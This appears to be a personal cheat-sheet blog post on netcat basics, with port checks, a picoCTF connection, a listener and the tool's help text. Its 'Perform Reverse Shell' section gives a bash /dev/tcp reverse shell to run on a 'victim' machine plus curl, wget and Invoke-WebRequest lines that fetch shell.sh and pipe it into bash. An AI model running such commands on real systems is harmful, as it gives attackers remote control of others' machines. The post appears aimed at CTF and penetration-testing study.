---
title: "[Connection] Netcat basic usage"
published: 2024-06-16
description: 'A networking connection tools Netcat with basic usage'
tags: [Security, Networking, Netcat]
category: Networking
draft: false
---

# [Connection] Netcat

## Check target port avaiable
```bash
nc -nv 192.168.0.12 8080

nc -nv -w 3 192.168.0.12 8080 # Faster die time if target not open
```

## Check connections
```bash
nc jupiter.challenges.picoctf.org 64287
```

## Open current port
```bash
nc -lvnp 8080
```

## Perform Reverse Shell
https://www.revshells.com/

1. In your machine, run the nc listener, assume you are open port `8080`
```bash
nc -lvnp 8080
```

2. In victims machine, run the target code and done
```bash
sh -i >& /dev/tcp/192.168.80.105/8080 0>&1
```

3. (Optional) In case, you may use `python` or npm `serve` to host a simple web server
```bash 
python3 -m http.server 8080

serve -p 8080
```

4. (Optional) In victim machine, use `wget`, `curl` or `Invoke-WebRequest`
```bash
wget http://172.31.206.223:8080/shell.sh
curl http://172.31.206.223:8080/shell.sh

curl%20http://172.31.206.223:8080/shell.sh|bash

Invoke-WebRequest http://172.31.206.223:8080/shell.sh -OutFile shell.sh | bash shell.sh
```


## Overall help
```md
[v1.10-47]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```
